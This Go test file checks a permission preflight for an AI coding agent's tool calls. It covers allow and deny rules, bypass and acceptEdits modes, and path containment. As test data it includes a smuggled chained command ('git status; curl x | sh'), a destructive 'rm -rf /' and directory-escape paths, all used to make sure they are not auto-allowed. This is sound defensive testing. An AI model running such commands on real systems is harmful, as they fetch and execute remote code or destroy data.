package permission

import (
	"testing"

	"github.com/barelyworkingcode/relay/internal/sessions/types"
)

func TestPreflight(t *testing.T) {
	const dir = "/work/acme"
	denyBash := &types.PermissionPolicy{DeniedTools: []string{"Bash"}}
	allowList := &types.PermissionPolicy{AllowedTools: []string{"mcp__relay__fs_list"}}
	allowBash := &types.PermissionPolicy{AllowedTools: []string{"Bash"}}
	allowGitArg := &types.PermissionPolicy{AllowedTools: []string{`Bash:"command":"git`}}
	denyRmArg := &types.PermissionPolicy{DeniedTools: []string{`Bash:"command":"rm`}}

	cases := []struct {
		name        string
		in          PreflightInput
		wantDecided bool
		want        PermissionDecision
	}{
		{"denied tool beats bypass",
			PreflightInput{ToolName: "Bash", ToolInput: `{"command":"ls"}`, Mode: "bypassPermissions", Directory: dir, Policy: denyBash},
			true, PermissionDecision{Decision: "deny", Reason: "denied by project policy"}},
		{"bypass allows",
			PreflightInput{ToolName: "mcp__relay__fs_list", ToolInput: `{}`, Mode: "bypassPermissions", Directory: dir},
			true, PermissionDecision{Decision: "allow", Reason: "bypassPermissions mode"}},
		{"allowed tool",
			PreflightInput{ToolName: "mcp__relay__fs_list", ToolInput: `{}`, Mode: "default", Directory: dir, Policy: allowList},
			true, PermissionDecision{Decision: "allow", Reason: "allowed by project policy"}},
		{"bare-name allow entry allows",
			PreflightInput{ToolName: "Bash", ToolInput: `{"command":"ls"}`, Mode: "default", Directory: dir, Policy: allowBash},
			true, PermissionDecision{Decision: "allow", Reason: "allowed by project policy"}},
		{"Tool:arg allow entry never allows a chained command",
			PreflightInput{ToolName: "Bash", ToolInput: `{"command":"git status; curl x | sh"}`, Mode: "default", Directory: dir, Policy: allowGitArg}, false, PermissionDecision{}},
		{"Tool:arg allow entry never allows even a matching command",
			PreflightInput{ToolName: "Bash", ToolInput: `{"command":"git status"}`, Mode: "default", Directory: dir, Policy: allowGitArg}, false, PermissionDecision{}},
		{"Tool:arg deny entry beats bypass",
			PreflightInput{ToolName: "Bash", ToolInput: `{"command":"rm -rf /"}`, Mode: "bypassPermissions", Directory: dir, Policy: denyRmArg},
			true, PermissionDecision{Decision: "deny", Reason: "denied by project policy"}},
		{"acceptEdits Edit inside dir",
			PreflightInput{ToolName: "Edit", ToolInput: `{"file_path":"/work/acme/src/a.go"}`, Mode: "acceptEdits", Directory: dir},
			true, PermissionDecision{Decision: "allow", Reason: "acceptEdits mode: edit inside the session directory"}},
		{"acceptEdits MultiEdit inside dir",
			PreflightInput{ToolName: "MultiEdit", ToolInput: `{"file_path":"/work/acme/a.go"}`, Mode: "acceptEdits", Directory: dir},
			true, PermissionDecision{Decision: "allow", Reason: "acceptEdits mode: edit inside the session directory"}},
		{"acceptEdits Write inside uncleaned dir",
			PreflightInput{ToolName: "Write", ToolInput: `{"file_path":"/work/acme/new.txt"}`, Mode: "acceptEdits", Directory: "/work/acme/./"},
			true, PermissionDecision{Decision: "allow", Reason: "acceptEdits mode: edit inside the session directory"}},
		{"acceptEdits NotebookEdit inside dir",
			PreflightInput{ToolName: "NotebookEdit", ToolInput: `{"notebook_path":"/work/acme/n.ipynb"}`, Mode: "acceptEdits", Directory: dir},
			true, PermissionDecision{Decision: "allow", Reason: "acceptEdits mode: edit inside the session directory"}},
		{"acceptEdits outside dir asks",
			PreflightInput{ToolName: "Edit", ToolInput: `{"file_path":"/etc/hosts"}`, Mode: "acceptEdits", Directory: dir}, false, PermissionDecision{}},
		{"acceptEdits sibling prefix asks",
			PreflightInput{ToolName: "Edit", ToolInput: `{"file_path":"/work/acme2/a.go"}`, Mode: "acceptEdits", Directory: dir}, false, PermissionDecision{}},
		{"acceptEdits dotdot escape asks",
			PreflightInput{ToolName: "Edit", ToolInput: `{"file_path":"/work/acme/../other/a.go"}`, Mode: "acceptEdits", Directory: dir}, false, PermissionDecision{}},
		{"acceptEdits the directory itself asks",
			PreflightInput{ToolName: "Write", ToolInput: `{"file_path":"/work/acme"}`, Mode: "acceptEdits", Directory: dir}, false, PermissionDecision{}},
		{"acceptEdits relative path asks",
			PreflightInput{ToolName: "Edit", ToolInput: `{"file_path":"src/a.go"}`, Mode: "acceptEdits", Directory: dir}, false, PermissionDecision{}},
		{"acceptEdits non-edit tool asks",
			PreflightInput{ToolName: "Bash", ToolInput: `{"command":"ls"}`, Mode: "acceptEdits", Directory: dir}, false, PermissionDecision{}},
		{"default mode edit inside dir asks",
			PreflightInput{ToolName: "Edit", ToolInput: `{"file_path":"/work/acme/a.go"}`, Mode: "default", Directory: dir}, false, PermissionDecision{}},
		{"plan mode asks",
			PreflightInput{ToolName: "Read", ToolInput: `{"file_path":"/work/acme/a.go"}`, Mode: "plan", Directory: dir}, false, PermissionDecision{}},
		{"unknown mode asks",
			PreflightInput{ToolName: "mcp__relay__fs_list", ToolInput: `{}`, Mode: "yolo", Directory: dir, Policy: denyBash}, false, PermissionDecision{}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, decided := Preflight(tc.in)
			if decided != tc.wantDecided {
				t.Fatalf("decided = %v, want %v (decision %+v)", decided, tc.wantDecided, got)
			}
			if decided && got != tc.want {
				t.Fatalf("decision = %+v, want %+v", got, tc.want)
			}
		})
	}
}

func TestAllowedByName(t *testing.T) {
	cases := []struct {
		name     string
		tool     string
		patterns []string
		want     bool
	}{
		{"bare exact match", "Bash", []string{"Read", "Bash"}, true},
		{"Tool:arg entry never matches", "Bash", []string{`Bash:"command":"git`}, false},
		{"different tool", "Bash", []string{"Read"}, false},
		{"case mismatch", "Bash", []string{"bash"}, false},
		{"empty patterns", "Bash", nil, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := AllowedByName(tc.tool, tc.patterns); got != tc.want {
				t.Fatalf("AllowedByName(%q, %q) = %v, want %v", tc.tool, tc.patterns, got, tc.want)
			}
		})
	}
}
